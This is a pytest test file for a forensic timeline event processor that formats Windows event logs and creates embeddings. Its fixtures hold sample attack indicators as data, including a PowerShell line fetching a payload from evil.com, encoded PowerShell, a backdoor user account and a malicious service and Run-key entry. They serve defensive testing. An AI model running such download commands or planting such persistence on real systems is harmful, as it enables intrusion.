"""
Advanced unit tests for event processor.
Tests format functions, filtering logic, and embedding generation.
"""

import pytest
from unittest.mock import AsyncMock, MagicMock, patch
from uuid import uuid4
import json


class TestFormatEventForTimeline:
    """Test _format_event_for_timeline function."""

    def test_format_sysmon_process_creation(self):
        """
        Test that the `_format_event_for_timeline` helper correctly formats Sysmon Event ID 1 (Process Creation) payloads into a human-readable title and description suitable for timeline display.

        The test constructs a minimal Sysmon process creation payload containing the image path, command line, and parent image. It then calls `_format_event_for_timeline` with an identifier (`"evtx_sysmon_1"`) that signals the Sysmon Process Creation event type.

        Assertions verify that:
        - The generated title includes the phrase “Process Created” and the executable name (`cmd.exe`).
        - The description contains the command line argument (`whoami`) and the parent process name (`explorer.exe`).
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {
            "event_data.Image": "C:\\Windows\\System32\\cmd.exe",
            "event_data.CommandLine": "cmd.exe /c whoami",
            "event_data.ParentImage": "C:\\Windows\\explorer.exe",
        }

        title, description = _format_event_for_timeline("evtx_sysmon_1", payload)

        assert "Process Created" in title
        assert "cmd.exe" in title
        assert "whoami" in description
        assert "explorer.exe" in description

    def test_format_sysmon_network_connection(self):
        """
        Test that the Sysmon Event ID 3 (Network Connection) formatter produces a title containing “Network Connection” and the executable name extracted from the image path, and that the generated description includes both the destination IP address and port from the payload. This validates correct parsing of `event_data.Image`, `event_data.DestinationIp`, and `event_data.DestinationPort` fields when formatting events for timeline display.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {
            "event_data.Image": "C:\\Program Files\\Chrome\\chrome.exe",
            "event_data.DestinationIp": "192.168.1.100",
            "event_data.DestinationPort": "443",
        }

        title, description = _format_event_for_timeline("evtx_sysmon_3", payload)

        assert "Network Connection" in title
        assert "chrome.exe" in title
        assert "192.168.1.100" in description
        assert "443" in description

    def test_format_sysmon_file_created(self):
        """
        Test that the Sysmon Event ID 11 (File Created) formatter produces a title containing “File Created” and the target filename, and a description that includes the image name of the creating process. The test supplies a payload with an Image path and a TargetFilename, invokes the internal formatting function, and asserts the expected substrings appear in the returned title and description.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {
            "event_data.Image": "C:\\Windows\\System32\\notepad.exe",
            "event_data.TargetFilename": "C:\\Users\\test\\malware.exe",
        }

        title, description = _format_event_for_timeline("evtx_sysmon_11", payload)

        assert "File Created" in title
        assert "malware.exe" in title
        assert "notepad.exe" in description

    def test_format_security_successful_logon(self):
        """
        Test case verifying that the `_format_event_for_timeline` helper correctly formats a Security event with ID 4624 (Successful Logon).

        The test constructs a minimal payload containing the target user name, logon type, and source IP address, invokes the formatter with the event identifier `"evtx_security_4624"`, and asserts that:

        * The generated title includes the phrase “Successful Logon” and the supplied username.
        * The description contains the formatted logon type line (`Logon Type: 10`).
        * The description also includes the provided IP address.

        This ensures that successful-logon events are rendered with the expected human-readable title and descriptive details for timeline display.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {
            "event_data.TargetUserName": "Administrator",
            "event_data.LogonType": "10",
            "event_data.IpAddress": "192.168.1.50",
        }

        title, description = _format_event_for_timeline("evtx_security_4624", payload)

        assert "Successful Logon" in title
        assert "Administrator" in title
        assert "Logon Type: 10" in description
        assert "192.168.1.50" in description

    def test_format_security_failed_logon(self):
        """
        Test that the `_format_event_for_timeline` helper correctly formats a Security event with ID 4625 (Failed Logon). The test supplies a minimal payload containing the target user name and source IP address, invokes the formatter with the appropriate event type identifier, and verifies that the generated title includes both the “Failed Logon” label and the supplied user name, while the description contains the provided IP address.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {"event_data.TargetUserName": "admin", "event_data.IpAddress": "10.0.0.1"}

        title, description = _format_event_for_timeline("evtx_security_4625", payload)

        assert "Failed Logon" in title
        assert "admin" in title
        assert "10.0.0.1" in description

    def test_format_security_process_creation(self):
        """
        Test that the security event formatter correctly formats a Process Creation (Event ID 4688) payload.

        The test imports the private helper `_format_event_for_timeline`, supplies a minimal payload containing the new process name and command line, invokes the formatter with the identifier `"evtx_security_4688"`, and verifies that:
        - The generated title includes the phrase “Process Created”.
        - The title also contains the executable name (`powershell.exe`).
        - The description captures part of the command line arguments (specifically the `-enc base64` snippet).
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {
            "event_data.NewProcessName": "C:\\Windows\\System32\\powershell.exe",
            "event_data.CommandLine": "powershell.exe -enc base64...",
        }

        title, description = _format_event_for_timeline("evtx_security_4688", payload)

        assert "Process Created" in title
        assert "powershell.exe" in title
        assert "-enc base64" in description

    def test_format_security_user_created(self):
        """
        Test that the `_format_event_for_timeline` helper correctly formats a Security Event ID 4720 (User Account Created) by verifying that the generated title contains both the expected event description and the target username extracted from the payload.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {"event_data.TargetUserName": "backdoor_user"}

        title, description = _format_event_for_timeline("evtx_security_4720", payload)

        assert "User Account Created" in title
        assert "backdoor_user" in title

    def test_format_security_service_installation(self):
        """
        Test formatting of Security Event ID 7045 (Service Installation) by verifying that the generated title contains "Service Installed" and the service name from the payload, and that the description includes the executable filename extracted from the image path.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {
            "event_data.ServiceName": "MaliciousService",
            "event_data.ImagePath": "C:\\Windows\\Temp\\malware.exe",
        }

        title, description = _format_event_for_timeline("evtx_security_7045", payload)

        assert "Service Installed" in title
        assert "MaliciousService" in title
        assert "malware.exe" in description

    def test_format_system_service_installation(self):
        """
        Test that the system service installation event (ID 7045) is formatted correctly for timeline display.

        The test imports the internal helper `_format_event_for_timeline`, constructs a minimal payload containing the service name and image path, invokes the formatter with the identifier `evtx_system_7045`, and verifies that:

        * The generated title includes the phrase “Service Installed”.
        * The service name from the payload (`TestService`) appears in the title.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {
            "event_data.ServiceName": "TestService",
            "event_data.ImagePath": "C:\\Program Files\\test.exe",
        }

        title, description = _format_event_for_timeline("evtx_system_7045", payload)

        assert "Service Installed" in title
        assert "TestService" in title

    def test_format_powershell_event(self):
        """
        Test that a PowerShell event is correctly formatted for timeline display.

        The test imports the internal helper `_format_event_for_timeline` from
        `app.services.rag.event_processor` and supplies a minimal payload
        containing a `ScriptBlockText` entry that mimics a malicious command.
        It then verifies that:

        * The generated title includes the phrase `PowerShell Execution`, indicating
          that the formatter recognized the event type `evtx_powershell_4104`.
        * The description contains the original command string (e.g., `Invoke-WebRequest`),
          confirming that the payload data is incorporated into the formatted output.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {"event_data.ScriptBlockText": "Invoke-WebRequest http://evil.com/payload.ps1"}

        title, description = _format_event_for_timeline("evtx_powershell_4104", payload)

        assert "PowerShell Execution" in title
        assert "Invoke-WebRequest" in description

    def test_format_mft_event(self):
        """
        Test that the `_format_event_for_timeline` helper correctly formats an MFT file-creation event.\n\nThe test constructs a minimal payload representing a newly created file and invokes the formatter with the `mft_file_created` event type. It then verifies that:\n\n* The generated title contains the generic \"File Activity\" label, indicating that the formatter recognized the event as a file-related action.\n* The filename (`suspicious.exe`) appears in the title, confirming that the path information from the payload is incorporated into the human-readable output.\n\nNo explicit return value is expected; assertions raise an exception on failure.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {
            "path": "C:\\Users\\test\\Downloads\\suspicious.exe",
            "file_path": "C:\\Users\\test\\Downloads\\suspicious.exe",
        }

        title, description = _format_event_for_timeline("mft_file_created", payload)

        assert "File Activity" in title
        assert "suspicious.exe" in title

    def test_format_registry_event(self):
        """
        Test that the `_format_event_for_timeline` helper correctly formats a registry-key creation event. The test supplies a payload containing a Windows registry key path, invokes the formatter with the `"registry_key_created"` event type, and asserts that the generated title includes the generic “Registry Key” label as well as the specific sub-path (`"Run\\Malware"`). This verifies both the inclusion of a human-readable category and proper handling of the key’s trailing components.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {"key_path": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware"}

        title, description = _format_event_for_timeline("registry_key_created", payload)

        assert "Registry Key" in title
        assert "Run\\Malware" in title

    def test_format_prefetch_event(self):
        """
        Test that the `_format_event_for_timeline` helper correctly formats a prefetch execution event.\n\nThe test supplies a payload containing an executable name and run count, invokes the formatter with the `prefetch_execution` event type, and verifies that:\n- The generated title includes the word “Prefetch” and the provided executable name.\n- The description contains a line reporting the run count in the format `Run Count: <value>`.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {"executable": "MALWARE.EXE", "run_count": 5}

        title, description = _format_event_for_timeline("prefetch_execution", payload)

        assert "Prefetch" in title
        assert "MALWARE.EXE" in title
        assert "Run Count: 5" in description

    def test_format_lnk_event(self):
        """
        Test that the `_format_event_for_timeline` helper correctly formats a parsed LNK file event by verifying that the generated title contains the expected "LNK File" label and includes the executable name extracted from the payload. The test supplies a minimal payload with `target_path` and `target` pointing to `cmd.exe`, calls the formatter with the `"lnk_file_parsed"` event type, and asserts that both the title and description reflect the appropriate information.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {
            "target_path": "C:\\Windows\\System32\\cmd.exe",
            "target": "C:\\Windows\\System32\\cmd.exe",
        }

        title, description = _format_event_for_timeline("lnk_file_parsed", payload)

        assert "LNK File" in title
        assert "cmd.exe" in title

    def test_format_generic_event(self):
        """
        Test that the generic event formatter correctly handles an unknown event type.

        The test imports the private helper `_format_event_for_timeline` from the event processor module and supplies a payload containing arbitrary fields. It verifies that:

        - The generated title includes the string `Event: custom_event_type` indicating that the unknown type is reflected in the output.
        - The description contains the custom field name (`custom_field`), confirming that all payload keys are incorporated into the formatted description.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {"custom_field": "custom_value", "another_field": 123}

        title, description = _format_event_for_timeline("custom_event_type", payload)

        assert "Event: custom_event_type" in title
        assert "custom_field" in description

    def test_format_event_with_non_dotted_keys(self):
        """
        Test that the internal `_format_event_for_timeline` helper correctly formats events whose payload keys are not dot-separated strings, ensuring it still produces an appropriate title containing the expected process creation description and includes the command name within the title.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe /c dir",
            "ParentImage": "C:\\Windows\\explorer.exe",
        }

        title, description = _format_event_for_timeline("evtx_sysmon_1", payload)

        # Should still work with non-dotted keys
        assert "Process Created" in title
        assert "cmd.exe" in title

    def test_format_event_with_missing_fields(self):
        """
        Test that the `_format_event_for_timeline` helper correctly handles an event payload lacking optional fields.

        The test supplies an empty dictionary as the payload for a Sysmon process-creation event (`evtx_sysmon_1`). It verifies that:
        - The function does not raise an exception when required data is missing.
        - The returned title contains the default description `"Process Created"`.
        - The title also includes the placeholder `"Unknown"` for any missing values.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {}  # Empty payload

        title, description = _format_event_for_timeline("evtx_sysmon_1", payload)

        # Should not crash, use defaults
        assert "Process Created" in title
        assert "Unknown" in title

    def test_format_sysmon_unknown_event_id(self):
        """
        Test that formatting an unknown Sysmon event ID produces a title containing the generic “Sysmon Event 99” label and includes all payload fields in the description. The function imports the internal formatter, passes a dummy payload for an undefined Sysmon event (ID 99), and asserts that the generated title contains the expected event identifier and that the description incorporates the provided payload key.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {"some_field": "some_value"}

        title, description = _format_event_for_timeline("evtx_sysmon_99", payload)

        assert "Sysmon Event 99" in title
        assert "some_field" in description

    def test_format_security_unknown_event_id(self):
        """
        Test that formatting an unknown Security event ID produces a title containing the generic “Security Event <ID>” pattern.

        This test imports the private helper `_format_event_for_timeline`, supplies a dummy payload, and invokes it with an event type string `evtx_security_9999`. It then asserts that the returned title includes the substring `"Security Event 9999"`, confirming that unknown security events fall back to a generic title format.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        payload = {"test_data": "test"}

        title, description = _format_event_for_timeline("evtx_security_9999", payload)

        assert "Security Event 9999" in title

    def test_format_event_truncates_long_description(self):
        """
        Test that `_format_event_for_timeline` correctly truncates overly long event descriptions.\n\nThe test constructs a payload with many fields, each containing a 100-character string, to ensure the generated description exceeds the expected limit. It then calls `_format_event_for_timeline` with a custom event type and verifies that the returned description length does not exceed 500 characters. This confirms that the function enforces the maximum description size constraint.
        """
        from app.services.rag.event_processor import _format_event_for_timeline

        # Create a very large payload
        large_payload = {f"field_{i}": "x" * 100 for i in range(100)}

        title, description = _format_event_for_timeline("custom_event", large_payload)

        # Description should be truncated to 500 chars
        assert len(description) <= 500


@pytest.mark.asyncio
class TestGetFilterConfig:
    """Test _get_filter_config function."""

    async def test_get_filter_config_exists(self):
        """
        Test that _get_filter_config correctly retrieves an existing filter configuration from the database.

        The test creates a mock asynchronous database session and a random investigation ID, then mocks a filter config object whose `content` attribute contains a dictionary. The database execute call is mocked to return this config as the first scalar result. After awaiting `_get_filter_config`, the test asserts that the returned configuration matches the expected dictionary.
        """
        from app.services.rag.event_processor import _get_filter_config

        db = AsyncMock()
        investigation_id = uuid4()

        # Mock filter config
        mock_config = MagicMock()
        mock_config.content = {"test_key": "test_value"}

        mock_result = MagicMock()
        mock_result.scalars().first.return_value = mock_config
        db.execute.return_value = mock_result

        config = await _get_filter_config(db, investigation_id)

        assert config == {"test_key": "test_value"}

    async def test_get_filter_config_not_found_returns_default(self):
        """
        Test that the `_get_filter_config` helper returns the default filter configuration when no custom config is found in the database for the given investigation ID. The test sets up an asynchronous mock database session that simulates an empty query result, invokes the function, and asserts that the returned value matches `FilterEngine.DEFAULT_CONFIG`.
        """
        from app.services.rag.event_processor import _get_filter_config
        from app.services.rag.filter_engine import FilterEngine

        db = AsyncMock()
        investigation_id = uuid4()

        # Mock no filter config found
        mock_result = MagicMock()
        mock_result.scalars().first.return_value = None
        db.execute.return_value = mock_result

        config = await _get_filter_config(db, investigation_id)

        assert config == FilterEngine.DEFAULT_CONFIG

    async def test_get_filter_config_no_content_returns_default(self):
        """
        Test that the `_get_filter_config` helper returns the default filter configuration when the stored configuration record exists but its `content` attribute is `None`. The test sets up an asynchronous mock database session, creates a mock result representing a configuration with no content, invokes the function under test, and asserts that the returned value matches `FilterEngine.DEFAULT_CONFIG`.
        """
        from app.services.rag.event_processor import _get_filter_config
        from app.services.rag.filter_engine import FilterEngine

        db = AsyncMock()
        investigation_id = uuid4()

        # Mock filter config with no content
        mock_config = MagicMock()
        mock_config.content = None

        mock_result = MagicMock()
        mock_result.scalars().first.return_value = mock_config
        db.execute.return_value = mock_result

        config = await _get_filter_config(db, investigation_id)

        assert config == FilterEngine.DEFAULT_CONFIG


@pytest.mark.asyncio
class TestBatchCreateEmbeddings:
    """Test _batch_create_embeddings function."""

    async def test_batch_create_embeddings_empty_list(self):
        """
        Test that `_batch_create_embeddings` correctly handles an empty list of events by returning a count of zero. The test sets up mock database and LLM configuration objects, invokes the function with no events, and asserts that the returned embedding count is 0.
        """
        from app.services.rag.event_processor import _batch_create_embeddings

        db = AsyncMock()
        llm_config = MagicMock()

        count = await _batch_create_embeddings(db, [], 1, llm_config)

        assert count == 0

    async def test_batch_create_embeddings_no_provider(self):
        """
        Test that _batch_create_embeddings returns zero when no embedding provider is configured.

        The test sets up a mock database and an llm_config object whose `embedding_provider` attribute is None, then calls `_batch_create_embeddings` with a single dummy event. It asserts that the returned count of processed embeddings is 0, confirming that the function correctly skips processing when the provider is missing.
        """
        from app.services.rag.event_processor import _batch_create_embeddings

        db = AsyncMock()
        llm_config = MagicMock()
        llm_config.embedding_provider = None

        events = [(1, "evtx_sysmon_1", {"test": "data"})]

        count = await _batch_create_embeddings(db, events, 1, llm_config)

        assert count == 0

    async def test_batch_create_embeddings_no_api_url(self):
        """
        Test case verifying that when the embedding provider configuration lacks an API URL, the internal `_batch_create_embeddings` helper exits early without processing any events and returns a count of zero. The test sets up a mock database connection and a `llm_config` with `embedding_provider` set to "ollama" but `embedding_api_url` left as `None`, then calls the function with a single sample event tuple. It asserts that the returned processed-event count is zero, confirming correct handling of missing configuration.
        """
        from app.services.rag.event_processor import _batch_create_embeddings

        db = AsyncMock()
        llm_config = MagicMock()
        llm_config.embedding_provider = "ollama"
        llm_config.embedding_api_url = None

        events = [(1, "evtx_sysmon_1", {"test": "data"})]

        count = await _batch_create_embeddings(db, events, 1, llm_config)

        assert count == 0

    async def test_batch_create_embeddings_success(self):
        """
        Test the successful creation of embeddings in batch mode.

        This unit test verifies that `_batch_create_embeddings` correctly processes a list of events,
        uses the configured embedding provider to generate vector representations, inserts each
        embedding into the database, and commits the transaction for every inserted record.

        The test sets up:
        - A mock asynchronous database connection (`db`) with an `execute` method returning a
          result whose `fetchone` yields a dummy embedding ID.
        - A mocked LLM configuration object specifying Ollama as the provider and relevant API
          details.
        - Sample event data containing minimal fields required for embedding generation.
        - A patched `Embedder` class that returns predefined NumPy arrays when its asynchronous
          `embed` method is called.

        After invoking `_batch_create_embeddings` with these mocks, the test asserts that:
        - The function reports a count equal to the number of processed events (2).
        - The database's `commit` method is called once per successful insertion (2 times).
        """
        from app.services.rag.event_processor import _batch_create_embeddings
        import numpy as np

        db = AsyncMock()
        llm_config = MagicMock()
        llm_config.embedding_provider = "ollama"
        llm_config.embedding_api_url = "http://localhost:11434"
        llm_config.embedding_api_key = None
        llm_config.embedding_model_name = "nomic-embed-text"

        events = [
            (1, "evtx_sysmon_1", {"event_data.Image": "cmd.exe"}),
            (2, "evtx_sysmon_3", {"event_data.Image": "chrome.exe"}),
        ]

        # Mock embedder
        with patch("app.services.rag.embedding.Embedder") as mock_embedder_class:
            mock_embedder = AsyncMock()
            mock_embedder.embed.return_value = [
                np.array([0.1, 0.2, 0.3]),
                np.array([0.4, 0.5, 0.6]),
            ]
            mock_embedder_class.return_value = mock_embedder

            # Mock database insert
            mock_insert_result = MagicMock()
            mock_insert_result.fetchone.return_value = (123,)  # embedding_id
            db.execute.return_value = mock_insert_result

            count = await _batch_create_embeddings(db, events, 1, llm_config)

            assert count == 2
            # Commit is called once per batch, not per event
            assert db.commit.call_count == 1


@pytest.mark.asyncio
class TestProcessInterestingEvents:
    """Test process_interesting_events function."""

    async def test_process_interesting_events_no_llm_config(self):
        """
        Test that `process_interesting_events` returns zero when there is no active LLM configuration. The test mocks `get_active_llm_config` to return `None` and provides a default filter configuration via `_get_filter_config`. It also sets up the database mock to return an empty result set, simulating the absence of interesting events. The function is then called with a mocked asynchronous database connection, a generated investigation ID, and pagination parameters (page 1, page size 1). The assertion verifies that the returned count of processed events is `0`.
        """
        from app.services.rag.event_processor import process_interesting_events

        db = AsyncMock()
        investigation_id = uuid4()

        # Mock no LLM config
        with patch("app.services.rag.event_processor.get_active_llm_config", return_value=None):
            # Mock filter config
            with patch("app.services.rag.event_processor._get_filter_config") as mock_get_filter:
                from app.services.rag.filter_engine import FilterEngine

                mock_get_filter.return_value = FilterEngine.DEFAULT_CONFIG

                # Mock no events
                mock_result = MagicMock()
                mock_result.fetchall.return_value = []
                db.execute.return_value = mock_result

                count = await process_interesting_events(db, investigation_id, 1, 1)

                assert count == 0

    async def test_process_interesting_events_no_events(self):
        """
        Test that `process_interesting_events` correctly handles the case where no interesting events are found for a given artifact.

        This test sets up:
        - An asynchronous mock database connection.
        - A random investigation identifier.
        - A mocked LLM configuration with Ollama as the embedding provider.
        - Patches to return the default filter configuration and an empty result set from the database query.

        The function under test is invoked with the mocked dependencies, and the returned count of processed events is asserted to be zero, confirming that the processor gracefully handles an empty event list without errors.
        """
        from app.services.rag.event_processor import process_interesting_events

        db = AsyncMock()
        investigation_id = uuid4()

        # Mock LLM config
        mock_llm_config = MagicMock()
        mock_llm_config.embedding_provider = "ollama"
        mock_llm_config.embedding_api_url = "http://localhost:11434"

        with patch(
            "app.services.rag.event_processor.get_active_llm_config", return_value=mock_llm_config
        ):
            with patch("app.services.rag.event_processor._get_filter_config") as mock_get_filter:
                from app.services.rag.filter_engine import FilterEngine

                mock_get_filter.return_value = FilterEngine.DEFAULT_CONFIG

                # Mock no events
                mock_result = MagicMock()
                mock_result.fetchall.return_value = []
                db.execute.return_value = mock_result

                count = await process_interesting_events(db, investigation_id, 1, 1)

                assert count == 0

    async def test_process_interesting_events_filters_events(self):
        """
        Test that the `process_interesting_events` coroutine correctly filters events and creates embeddings only for those deemed interesting.

        The test sets up:
        - An asynchronous mock database connection.
        - A random investigation identifier.
        - A mocked LLM configuration with Ollama embedding settings.
        - Two synthetic events: one matching an “interesting” Sysmon EventID (1) and another non-interesting event (255).
        - Patches for `get_active_llm_config` to return the mock LLM config, `_get_filter_config` to supply the default filter configuration, and `_batch_create_embeddings` to simulate successful embedding creation.
        - A mocked database query that returns the synthetic events.

        The coroutine is invoked with a page size of 1 and a limit of 1. The test asserts that the returned count equals `1`, confirming that only the interesting event was processed and an embedding batch was created.
        """
        from app.services.rag.event_processor import process_interesting_events
        import numpy as np

        db = AsyncMock()
        investigation_id = uuid4()

        # Mock LLM config
        mock_llm_config = MagicMock()
        mock_llm_config.embedding_provider = "ollama"
        mock_llm_config.embedding_api_url = "http://localhost:11434"
        mock_llm_config.embedding_api_key = None
        mock_llm_config.embedding_model_name = "nomic-embed-text"

        # Mock events (one interesting, one not)
        mock_events = [
            (1, "evtx_sysmon_1", None, json.dumps({"EventID": 1, "Image": "cmd.exe"})),
            (2, "evtx_sysmon_255", None, json.dumps({"EventID": 255})),
        ]

        with patch(
            "app.services.rag.event_processor.get_active_llm_config", return_value=mock_llm_config
        ):
            with patch("app.services.rag.event_processor._get_filter_config") as mock_get_filter:
                from app.services.rag.filter_engine import FilterEngine

                mock_get_filter.return_value = FilterEngine.DEFAULT_CONFIG

                # Mock database query
                mock_result = MagicMock()
                mock_result.fetchall.return_value = mock_events
                db.execute.return_value = mock_result

                # Mock batch create embeddings
                with patch(
                    "app.services.rag.event_processor._batch_create_embeddings", return_value=1
                ):
                    count = await process_interesting_events(db, investigation_id, 1, 1)

                    # Should process and create embeddings
                    assert count == 1

    async def test_process_interesting_events_handles_errors(self):
        """
        Test that `process_interesting_events` correctly propagates exceptions raised while retrieving filter configuration and ensures the database transaction is rolled back.

        The test performs the following steps:
        - Mocks an asynchronous database connection (`db`) and generates a random investigation identifier.
        - Creates a mock LLM configuration with an embedding provider set to `"ollama"` and a local API URL.
        - Patches `get_active_llm_config` to return the mocked LLM config.
        - Patches `_get_filter_config` so that it raises a generic `Exception` with the message `"Test error"`.
        - Calls `process_interesting_events` inside a `pytest.raises` context, asserting that the raised exception matches the expected message.
        - Verifies that the database's `rollback` method is invoked after the exception occurs.
        """
        from app.services.rag.event_processor import process_interesting_events

        db = AsyncMock()
        investigation_id = uuid4()

        # Mock LLM config
        mock_llm_config = MagicMock()
        mock_llm_config.embedding_provider = "ollama"
        mock_llm_config.embedding_api_url = "http://localhost:11434"

        with patch(
            "app.services.rag.event_processor.get_active_llm_config", return_value=mock_llm_config
        ):
            with patch("app.services.rag.event_processor._get_filter_config") as mock_get_filter:
                # Make filter config raise an error
                mock_get_filter.side_effect = Exception("Test error")

                # Should raise the exception
                with pytest.raises(Exception, match="Test error"):
                    await process_interesting_events(db, investigation_id, 1, 1)

                # Should rollback
                db.rollback.assert_called()
